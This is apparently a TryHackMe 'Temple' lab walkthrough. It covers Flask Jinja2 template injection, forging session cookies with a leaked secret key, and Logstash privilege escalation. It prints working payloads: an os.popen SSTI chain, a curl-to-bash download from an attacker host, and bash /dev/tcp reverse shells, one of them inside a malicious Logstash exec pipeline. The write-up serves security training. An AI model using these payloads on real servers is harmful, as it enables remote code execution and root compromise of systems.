# [Temple](https://tryhackme.com/room/temple)

## Can you gain access to the temple?

# Gain access to the temple!

### Find flag1.txt

_Enumerate! Does the word templ(at)e mean anything?_

1. Run a full port scan with service version detection to identify all open ports on the target.

```bash
nmap -p- -sV <TARGET_IP>
```

**Results**

```
PORT      STATE SERVICE VERSION
7/tcp     open  echo
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
23/tcp    open  telnet  Linux telnetd
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
61337/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.6.9)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> Given the hint about templates the most interesting finding is port **61337** as it runs **Werkzeug**, the WSGI development server commonly used by **Flask** applications.

2. Enumerate directories on the Flask application running on port 61337. Most routes redirect unauthenticated users to `/login`, but `/temporary` returns 403 Forbidden, which indicates the path exists even though direct listing is blocked.

```bash
gobuster dir -u http://<TARGET_IP>:61337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results**

```
/home                 (Status: 302) [Size: 218] [--> http://<TARGET_IP>:61337/login]
/login                (Status: 200) [Size: 1676]
/admin                (Status: 403) [Size: 239]
/account              (Status: 302) [Size: 218] [--> http://<TARGET_IP>:61337/login]
/external             (Status: 302) [Size: 218] [--> http://<TARGET_IP>:61337/login]
/logout               (Status: 302) [Size: 218] [--> http://<TARGET_IP>:61337/login]
/application          (Status: 403) [Size: 239]
/internal             (Status: 302) [Size: 218] [--> http://<TARGET_IP>:61337/login]
/temporary            (Status: 403) [Size: 239]
```

3. A `403` response means the directory exists but is not accessible directly. Recursively enumerate `/temporary/` to find any hidden subdirectories.

```bash
gobuster dir -u http://<TARGET_IP>:61337/temporary/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results**

```
/dev                  (Status: 403) [Size: 239]
```

4. `dev` also returns `403`. Enumerate one level deeper to find any exposed endpoints inside it.

```bash
gobuster dir -u http://<TARGET_IP>:61337/temporary/dev/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results**

```
/newacc               (Status: 200) [Size: 1886]
```

> `/temporary/dev/newacc` is a user **registration** page that was not linked from the main application.

5. Navigate to `http://<TARGET_IP>:61337/temporary/dev/newacc` and register a test account. Log in and visit `http://<TARGET_IP>:61337/account`. The page displays: `Logged in as <YOUR_USER_NAME>`

> The username is rendered **directly into the HTML using Jinja2 template rendering** without any sanitization.

6. To confirm SSTI and extract the Flask application's secret key, register a new account with the username `{{config}}`. This is a valid Jinja2 expression that dumps the entire Flask application configuration object. After logging in and visiting `/account`, the page renders:

```
Logged in as <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

> The `SECRET_KEY` is `f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry`. Flask uses this key to cryptographically sign session cookies.

7. Install `flask-unsign` to work with Flask session cookies. First, grab the current session cookie from the browser (DevTools > Application > Cookies) and decode it to inspect its structure.

```bash
pip3 install flask-unsign
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25maWd9fSJ9.abrQEw.eTlpCFBQHUo3SNRsIvWgvTWye5Q'
```

**Results:**

```json
{'logged_in': True, 'username': '{{config}}'}
```

> The cookie stores our username as-is. Since the application renders the username through Jinja2 on the `/account` page, we can embed any Jinja2 payload into the `username` field of a forged cookie and have it executed server-side.

8. Forge a new session cookie containing an SSTI payload that executes an OS command. The payload `{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}` traverses Python's class hierarchy to reach the `os` module, calls `popen()` to run a shell command, and reads the output. Sign it with the stolen SECRET_KEY, then replace the `session` cookie in the browser and navigate to `/account` to see the command output.

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
```

<img width="505" height="278" alt="SCREEN01" src="https://github.com/user-attachments/assets/6149dd22-48f3-45c5-922c-88c40ffe0984" />

9. On the attacker machine, create a bash reverse shell script. When executed on the target, it will open a TCP connection back to our machine.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > shell.sh
```

10. In the same directory as `shell.sh`, start a Python HTTP server so the target can download the script.

```bash
python -m http.server
```

11. In a separate terminal, start a netcat listener to catch the incoming reverse shell connection.

```bash
nc -lvnp 4444
```

12. Forge a final cookie with a payload that uses `curl` to download `shell.sh` from our HTTP server and pipe it directly into `bash`. Set this cookie in the browser and visit `/account`. The server will fetch and execute the script, triggering the reverse shell.

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"curl http://<ATTACKER_IP>:8000/shell.sh | bash\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
```

13. Read the first flag from bill's home directory.

```bash
cat /home/bill/flag1.txt
```

<img width="371" height="241" alt="SCREEN02" src="https://github.com/user-attachments/assets/6ac4d4b6-3c46-40ea-9302-57dc6cafec63" />

---

### Find flag2.txt

_Make sure to look carefully at the running processes._

1. Search for files in `etc` that are writable by our current user.

```bash
find /etc/ -writable 2>/dev/null
```

**Results:**

```
/etc/logstash/conf.d/logstash-sample.conf
```

2. Inspect the full Logstash directory to understand its layout and permissions.

```bash
ls -la /etc/logstash/
```

**Results:**

```
total 48
drwxr-xr-x   3 root root  4096 Oct  4  2021 .
drwxr-xr-x 101 root root  4096 Oct  4  2021 ..
dr-xr-xr-x   2 root root  4096 Oct  3  2021 conf.d
-rw-r--r--   1 root root  2038 Oct  4  2021 jvm.options
-rw-r--r--   1 root root  7452 Oct  3  2021 log4j2.properties
-rw-r--r--   1 root root   342 Sep 16  2021 logstash-sample.conf
-rw-r--r--   1 root root 11223 Oct  3  2021 logstash.yml
-rw-r--r--   1 root root   285 Oct  3  2021 pipelines.yml
-rw-------   1 root root  1696 Sep 16  2021 startup.options
```

3. Check pipelines.yml to understand how Logstash loads its pipeline configuration. This tells us which files are processed and in what order.

```bash
cat /etc/logstash/pipelines.yml
```

**Results:**

```yml
# This file is where you define your pipelines. You can define multiple.
# For more information on multiple pipelines, see the documentation:
#   https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
```

> Logstash is configured to automatically load **all `.conf` files** from `/etc/logstash/conf.d/`. Since `logstash-sample.conf` lives in that directory and we can write to it, any pipeline we define there will be picked up and executed by the root-owned Logstash process.

4. Check the current content of the writable configuration file.

```bash
cd /etc/logstash/conf.d/
cat *
```

**Results:**

```
# Sample Logstash configuration for creating a simple
# Beats -> Logstash -> Elasticsearch pipeline.
```

5. Overwrite `logstash-sample.conf` with a malicious pipeline. The `exec` input plugin runs a shell command on a configurable interval. Setting i`nterval => 2` means Logstash will execute the reverse shell command every 2 seconds until a connection is established.

```conf
# Sample Logstash configuration for creating a simple
# Beats -> Logstash -> Elasticsearch pipeline.
input {
  exec {
    command => "/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1'"
    interval => 2
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

6. On the attacker machine, start a netcat listener on port 5555 to catch the incoming root shell.

```bash
nc -lvnp 5555
```

> Logstash monitors its configuration directory and will reload the pipeline automatically. Within a few seconds, it will execute the exec command as `root` and our listener will receive a root shell.

7. Once the reverse shell connects to the listener, read the second flag from the root home directory.

```bash
cat /root/flag2.txt
```

<img width="454" height="584" alt="SCREEN03" src="https://github.com/user-attachments/assets/5feb2094-0956-43de-a73f-2325f7050ba6" />
